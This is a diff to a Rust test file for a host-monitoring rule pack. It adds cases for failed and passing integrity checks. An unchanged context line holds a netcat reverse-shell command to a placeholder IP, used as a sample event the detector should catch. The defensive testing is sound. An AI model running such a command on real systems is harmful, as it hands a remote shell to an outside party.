@@ -65,6 +65,14 @@ fn every_pack_rule_loads_and_the_obvious_cases_fire() {
         ),
         (
             ev(
+                "integrity_check",
+                "",
+                json!({"state": "broken", "trigger": "schedule", "problem": "BadHash"}),
+            ),
+            "witness.self.integrity-failed",
+        ),
+        (
+            ev(
                 "proc_exec",
                 "/bin/nc",
                 json!({"exe": "/usr/bin/nc", "argv": ["nc", "-e", "/bin/sh", "1.2.3.4", "9"]}),
@@ -198,6 +206,11 @@ fn ordinary_activity_is_quiet() {
             "service_change",
             "",
             json!({"unit": "witnessd.service", "action": "start", "result": "done"}),
+        ),
+        ev(
+            "integrity_check",
+            "",
+            json!({"state": "ok", "trigger": "schedule"}),
         ),
         ev(
             "service_change",
